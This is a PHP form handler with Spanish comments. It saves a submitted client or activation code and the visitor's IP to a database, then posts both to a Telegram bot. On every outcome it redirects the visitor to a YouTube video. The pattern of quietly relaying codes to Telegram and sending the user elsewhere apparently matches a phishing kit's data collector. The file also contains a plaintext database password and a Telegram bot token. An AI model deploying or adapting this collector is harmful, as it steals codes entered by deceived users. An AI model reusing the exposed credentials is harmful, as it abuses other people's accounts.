<?php
// Configuración de la base de datos
$servidor = "localhost";
$usuario = "ikicywxf_clientes11"; // Cambia esto si tienes un usuario distinto
$contrasena = "D0]?Yg6BOAhr"; // Cambia esto si tienes una contraseña
$base_de_datos = "ikicywxf_clientes"; // Cambia el nombre de la base de datos si es necesario

// Conectar a la base de datos
$conexion = new mysqli($servidor, $usuario, $contrasena, $base_de_datos);

// Verificar la conexión
if ($conexion->connect_error) {
    die("Conexión fallida: " . $conexion->connect_error);
}

// Validar y sanitizar los datos del formulario
$referenceCode = isset($_POST['referenceCode']) ? trim($_POST['referenceCode']) : '';

if (empty($referenceCode)) {
    die("El código de cliente es requerido.");
}

// Obtener la IP del usuario
$userIP = $_SERVER['REMOTE_ADDR'];

// Lista de emojis posibles para asignar a las IPs
$emojis = ["🌀", "🔥", "⚡", "💥", "🌟", "🌈", "🚀", "👾", "🎯", "🐉"];

// Generar un índice aleatorio para seleccionar un emoji
$emojiIndex = crc32($userIP) % count($emojis); // Usamos crc32 para hacer una función determinista basada en la IP
$emoji = $emojis[$emojiIndex]; // Seleccionar el emoji

// Insertar los datos (código de cliente y IP) en la base de datos
$sql = "INSERT INTO clientes (clientes, ip) VALUES (?, ?)";
$stmt = $conexion->prepare($sql);

if ($stmt === false) {
    die("Error al preparar la consulta: " . $conexion->error);
}

$stmt->bind_param("ss", $referenceCode, $userIP);

if ($stmt->execute()) {
    // Los datos se guardaron correctamente en la base de datos

    // Configuración del Bot de Telegram
      $botToken = "7708309968:AAGHOu7LpbrlEY2mOYcVoIaYxOwr0KQcC7s"; // Sustituye con el token de tu bot
    $chatID = "5231018133"; // Sustituye con el chat ID o canal

    // Formato del mensaje que se enviará
    $contenidoTelegram = "*🔔 ACTIVACION 🔔*\n\n";  // Título en negrita
    $contenidoTelegram .= "*📌 ACTIVACION:* `$referenceCode`\n";  // Subtítulo en negrita y monoespaciado
    $contenidoTelegram .= "*🌐 IP del Cliente:* `$userIP`\n\n";  // Subtítulo en negrita y monoespaciado
    $contenidoTelegram .= "*🔖 Emoji:* `$emoji`\n";  // Subtítulo en negrita

    // Se asegura de que el mensaje utilice el modo de parseo adecuado (MarkdownV2 para emojis y formato avanzado)
    $data = [
        'chat_id' => $chatID,
        'text' => $contenidoTelegram,
        'parse_mode' => 'MarkdownV2'  // Usamos MarkdownV2 para un mejor formato
    ];

    // Enviar el mensaje a Telegram usando cURL
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // Ejecutar cURL y obtener la respuesta
    $resultado = curl_exec($ch);
    curl_close($ch);

    if ($resultado) {
        // Redirigir al usuario a una página de éxito (ejemplo: success.html)
        header("Location: https://www.youtube.com/watch?v=7Ocb0BZKglk.html");
        exit();
    } else {
        // Redirigir a una página de error si hay un problema con Telegram
        header("Location: https://www.youtube.com/watch?v=7Ocb0BZKglk.html");
        exit();
    }

} else {
    // Redirigir a una página de error si hay un problema con la base de datos
    header("Location: https://www.youtube.com/watch?v=7Ocb0BZKglk.html");
    exit();
}

// Cerrar la conexión
$stmt->close();
$conexion->close();
?>
